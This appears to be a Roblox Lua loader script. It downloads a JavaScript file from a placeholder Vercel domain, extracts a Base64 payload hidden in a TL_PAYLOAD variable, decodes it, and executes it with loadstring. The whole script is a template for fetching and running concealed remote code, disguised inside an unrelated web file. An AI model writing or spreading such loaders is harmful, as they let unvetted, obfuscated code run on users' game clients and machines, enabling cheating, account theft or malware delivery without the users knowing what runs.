local HttpService = game:GetService("HttpService")

local src = game:HttpGet("https://DEINE-DOMAIN.vercel.app/script.js")

local payload = src:match("TL_PAYLOAD%s*=%s*`(.-)`")

if not payload then
    error("Payload not found")
end

local decoded = HttpService:Base64Decode(payload)

loadstring(decoded)()